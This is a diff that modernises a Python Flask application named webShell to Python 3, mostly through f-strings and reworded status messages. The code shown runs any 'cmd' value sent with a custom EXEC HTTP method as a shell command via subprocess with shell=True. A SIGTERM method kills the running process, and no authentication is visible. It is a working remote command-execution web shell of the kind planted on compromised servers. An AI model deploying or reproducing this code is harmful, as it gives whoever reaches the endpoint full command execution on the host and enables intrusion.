@@ -1,7 +1,5 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python3
 
-from __future__ import print_function
 from flask import Flask, render_template, request, send_from_directory
 import subprocess
 from os.path import join as osPathJoin
@@ -16,10 +14,9 @@ webShellRootPath = webShell.root_path
 
 
 def execute(command):
-    command = ' ' + command
     global proc
     proc = subprocess.Popen(
-        command,
+        f' {command}',
         shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
@@ -37,15 +34,14 @@ def index():
     elif request.method == 'EXEC':
         if len(request.form) == 1:
             if 'cmd' in request.form:
-                command = request.form['cmd']
-                output = execute(command)
+                output = execute(request.form['cmd'])
                 return output
-        return 'Not a valid way of request.'
+        return 'Invalid request sent.'
     elif request.method == 'SIGTERM':
         killpg(getpgid(proc.pid), SIGTERM)
-        return 'PID: {}, killed via SIGTERM.'.format(proc.pid)
+        return f'PID: {proc.pid}, killed via SIGTERM.'
     else:
-        return 'WTH!'
+        return 'Internal Server Chaos'
 
 
 @webShell.route('/robots.txt')
